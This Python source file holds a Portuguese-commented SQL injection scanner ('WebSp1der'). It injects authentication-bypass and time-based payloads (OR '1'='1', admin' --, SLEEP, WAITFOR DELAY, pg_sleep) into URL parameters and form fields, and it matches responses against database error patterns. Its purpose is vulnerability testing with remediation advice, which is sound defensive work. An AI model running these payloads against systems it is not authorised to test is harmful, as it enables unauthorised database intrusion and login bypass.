#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WebSp1der - Scanner de SQL Injection
Desenvolvido por: mairinkdev (https://github.com/mairinkdev)
"""

import logging
import re
import time
import requests
from urllib.parse import urljoin, parse_qs, urlparse
from concurrent.futures import ThreadPoolExecutor

logger = logging.getLogger('websp1der.scanners.sqli')

class SQLiScanner:
    """Scanner para detecção de vulnerabilidades de SQL Injection."""

    def __init__(self, url=None, threads=5, timeout=10, session=None):
        """Inicializa o scanner de SQL Injection."""
        self.name = "SQL Injection Scanner"
        self.description = "Scanner para detecção de vulnerabilidades de SQL Injection"
        self.target_url = url
        self.threads = threads
        self.timeout = timeout
        self.session = session or requests.Session()
        
        # Payloads para teste de SQL Injection
        self.payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' #",
            "1' OR '1'='1'/*",
            "1') OR ('1'='1",
            "1')) OR (('1'='1",
            "admin' --",
            "admin' #",
            "admin'/*",
            "admin' OR '1'='1",
            "admin' OR '1'='1' --",
            "admin' OR '1'='1' #",
            "admin' OR '1'='1'/*",
            "admin') OR ('1'='1",
            "admin')) OR (('1'='1"
        ]
        
        # Payloads para teste de SQL Injection baseado em tempo
        self.time_payloads = [
            "1' SLEEP(5) --",
            "1' WAITFOR DELAY '0:0:5' --",
            "1' DELAY '0:0:5' --",
            "1' pg_sleep(5) --",
            "1' AND (SELECT * FROM (SELECT SLEEP(5)) as t) --",
            "1' AND 5=(SELECT 5 FROM PG_SLEEP(5)) --"
        ]
        
        # Padrões para detecção de erros de SQL
        self.error_patterns = [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysqli",
            r"unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"Unclosed quotation mark",
            r"You have an error in your SQL syntax",
            r"SQLite/JDBCDriver",
            r"SQLServer JDBC Driver",
            r"Syntax error or access violation",
            r"ORA-[0-9]{5}",
            r"Microsoft Access Driver",
            r"PostgreSQL.*?ERROR"
        ]

    def check_response_for_errors(self, response_text):
        """
        Verifica se a resposta contém erros SQL.
        
        Args:
            response_text (str): Texto da resposta HTTP
            
        Returns:
            bool: True se for detectado erro SQL, False caso contrário
        """
        for pattern in self.error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    def test_url_params(self, url, proxies=None, headers=None):
        """
        Testa vulnerabilidades SQL Injection em parâmetros de URL.
        
        Args:
            url (str): URL para testar
            proxies (dict, opcional): Configuração de proxy
            headers (dict, opcional): Cabeçalhos HTTP
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            return vulnerabilities
            
        logger.debug(f"Testando SQLi em parâmetros da URL: {url}")
        
        # Para cada parâmetro na URL
        for param, values in params.items():
            original_value = values[0] if values else ''
            
            # Testar com diferentes payloads
            for payload in self.payloads:
                # Construir nova URL com o payload
                new_params = params.copy()
                new_params[param] = [payload]
                
                query_string = '&'.join([f"{k}={v[0]}" for k, v in new_params.items()])
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                
                try:
                    # Fazer a requisição
                    response = self.session.get(
                        test_url,
                        headers=headers,
                        proxies=proxies,
                        timeout=self.timeout,
                        verify=False
                    )
                    
                    # Verificar se o SQLi baseado em erro foi bem-sucedido
                    if self.check_response_for_errors(response.text):
                        logger.warning(f"SQLi baseado em erro encontrado em {url}, parâmetro: {param}")
                        
                        # Criar relatório de vulnerabilidade
                        vulnerability = {
                            'type': 'sqli',
                            'name': 'SQL Injection',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'high',
                            'description': f"O parâmetro '{param}' é vulnerável a SQL Injection",
                            'details': "A aplicação retorna mensagens de erro SQL quando injetado payload malicioso",
                            'recommendation': """
                            Para prevenir vulnerabilidades de SQL Injection:
                            1. Usar consultas parametrizadas ou prepared statements.
                            2. Usar ORM (Object-Relational Mapping) com escape automático.
                            3. Validar e sanitizar todas as entradas de usuário.
                            4. Implementar princípio de menor privilégio no banco de dados.
                            5. Usar WAF (Web Application Firewall) como camada extra de proteção.
                            """
                        }
                        vulnerabilities.append(vulnerability)
                        break  # Pular para o próximo parâmetro após encontrar vulnerabilidade
                        
                except requests.RequestException as e:
                    logger.error(f"Erro ao testar SQLi na URL {url}: {str(e)}")
                    continue
            
            # Se não encontrou SQLi baseado em erro, testar time-based
            if not any(v for v in vulnerabilities if v['parameter'] == param and v['type'] == 'sqli'):
                # Testar payloads baseados em tempo
                for payload in self.time_payloads:
                    # Construir nova URL com o payload
                    new_params = params.copy()
                    new_params[param] = [payload]
                    
                    query_string = '&'.join([f"{k}={v[0]}" for k, v in new_params.items()])
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
                    
                    try:
                        # Medir tempo de resposta
                        start_time = time.time()
                        response = self.session.get(
                            test_url,
                            headers=headers,
                            proxies=proxies,
                            timeout=max(self.timeout, 10),  # Aumentar timeout para detectar delay
                            verify=False
                        )
                        end_time = time.time()
                        
                        # Se a resposta demorou mais de 4 segundos, pode ser vulnerável
                        if end_time - start_time > 4:
                            logger.warning(f"SQLi baseado em tempo encontrado em {url}, parâmetro: {param}")
                            
                            # Criar relatório de vulnerabilidade
                            vulnerability = {
                                'type': 'sqli_time',
                                'name': 'SQL Injection (Time-Based)',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'high',
                                'description': f"O parâmetro '{param}' é vulnerável a SQL Injection baseado em tempo",
                                'details': f"Tempo de resposta: {end_time - start_time:.2f} segundos",
                                'recommendation': """
                                Para prevenir vulnerabilidades de SQL Injection:
                                1. Usar consultas parametrizadas ou prepared statements.
                                2. Usar ORM (Object-Relational Mapping) com escape automático.
                                3. Validar e sanitizar todas as entradas de usuário.
                                4. Implementar princípio de menor privilégio no banco de dados.
                                5. Usar WAF (Web Application Firewall) como camada extra de proteção.
                                """
                            }
                            vulnerabilities.append(vulnerability)
                            break  # Pular para o próximo parâmetro após encontrar vulnerabilidade
                            
                    except requests.Timeout:
                        # Timeout também pode indicar vulnerabilidade time-based
                        logger.warning(f"Possível SQLi baseado em tempo (timeout) em {url}, parâmetro: {param}")
                        
                        # Criar relatório de vulnerabilidade
                        vulnerability = {
                            'type': 'sqli_time',
                            'name': 'SQL Injection (Time-Based)',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'high',
                            'description': f"O parâmetro '{param}' é vulnerável a SQL Injection baseado em tempo",
                            'details': "A requisição excedeu o tempo limite, indicando possível execução de comando SLEEP",
                            'recommendation': """
                            Para prevenir vulnerabilidades de SQL Injection:
                            1. Usar consultas parametrizadas ou prepared statements.
                            2. Usar ORM (Object-Relational Mapping) com escape automático.
                            3. Validar e sanitizar todas as entradas de usuário.
                            4. Implementar princípio de menor privilégio no banco de dados.
                            5. Usar WAF (Web Application Firewall) como camada extra de proteção.
                            """
                        }
                        vulnerabilities.append(vulnerability)
                        break  # Pular para o próximo parâmetro após encontrar vulnerabilidade
                        
                    except requests.RequestException as e:
                        logger.error(f"Erro ao testar SQLi time-based na URL {url}: {str(e)}")
                        continue
        
        return vulnerabilities

    def test_form(self, form, proxies=None, headers=None):
        """
        Testa vulnerabilidades SQL Injection em formulários.
        
        Args:
            form (dict): Informações do formulário
            proxies (dict, opcional): Configuração de proxy
            headers (dict, opcional): Cabeçalhos HTTP
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        vulnerabilities = []
        
        if not form or 'inputs' not in form or not form['inputs']:
            return vulnerabilities
        
        logger.debug(f"Testando SQLi em formulário: {form.get('url')}")
        
        # Obter detalhes do formulário
        form_url = form.get('url', '')
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').lower()
        
        # Construir URL de ação
        if form_action.startswith('http'):
            action_url = form_action
        elif form_action.startswith('/'):
            parsed_url = urlparse(form_url)
            action_url = f"{parsed_url.scheme}://{parsed_url.netloc}{form_action}"
        else:
            action_url = urljoin(form_url, form_action) if form_action else form_url
        
        # Para cada campo no formulário
        for field in form['inputs']:
            field_name = field.get('name', '')
            field_type = field.get('type', '')
            
            # Ignorar campos de senha, arquivos, botões, etc.
            if field_type in ['password', 'file', 'submit', 'button', 'image', 'reset']:
                continue
            
            # Testar com diferentes payloads
            for payload in self.payloads:
                # Preparar dados do formulário
                form_data = {}
                for input_field in form['inputs']:
                    input_name = input_field.get('name', '')
                    # Se for o campo que estamos testando, use o payload
                    if input_name == field_name:
                        form_data[input_name] = payload
                    # Caso contrário, use um valor padrão baseado no tipo
                    elif input_field.get('type') == 'email':
                        form_data[input_name] = 'test@example.com'
                    else:
                        form_data[input_name] = 'test123'
                
                try:
                    # Enviar o formulário
                    if form_method == 'post':
                        response = self.session.post(
                            action_url,
                            data=form_data,
                            headers=headers,
                            proxies=proxies,
                            timeout=self.timeout,
                            verify=False
                        )
                    else:  # método GET
                        response = self.session.get(
                            action_url,
                            params=form_data,
                            headers=headers,
                            proxies=proxies,
                            timeout=self.timeout,
                            verify=False
                        )
                    
                    # Verificar se o SQLi foi bem-sucedido
                    if self.check_response_for_errors(response.text):
                        logger.warning(f"SQLi encontrado em formulário {action_url}, campo: {field_name}")
                        
                        # Criar relatório de vulnerabilidade
                        vulnerability = {
                            'type': 'sqli',
                            'name': 'SQL Injection em Formulário',
                            'url': action_url,
                            'parameter': field_name,
                            'payload': payload,
                            'severity': 'high',
                            'description': f"O campo '{field_name}' no formulário é vulnerável a SQL Injection",
                            'details': "O formulário retorna mensagens de erro SQL quando injetado payload malicioso",
                            'recommendation': """
                            Para prevenir vulnerabilidades de SQL Injection:
                            1. Usar consultas parametrizadas ou prepared statements.
                            2. Usar ORM (Object-Relational Mapping) com escape automático.
                            3. Validar e sanitizar todas as entradas de usuário.
                            4. Implementar princípio de menor privilégio no banco de dados.
                            5. Usar WAF (Web Application Firewall) como camada extra de proteção.
                            """
                        }
                        vulnerabilities.append(vulnerability)
                        break  # Pular para o próximo campo após encontrar vulnerabilidade
                        
                except requests.RequestException as e:
                    logger.error(f"Erro ao testar SQLi em formulário {action_url}: {str(e)}")
                    continue
        
        return vulnerabilities

    def scan(self):
        """
        Executa o escaneamento completo de SQL Injection.
        
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        if not self.target_url:
            logger.error("URL alvo não especificada para SQLi Scanner")
            return []
            
        vulnerabilities = []
        
        # Testar a URL principal para parâmetros
        vulnerabilities.extend(self.test_url_params(self.target_url))
        
        # Se houver URLs adicionais para testar, poderíamos adicionar aqui
        
        return vulnerabilities 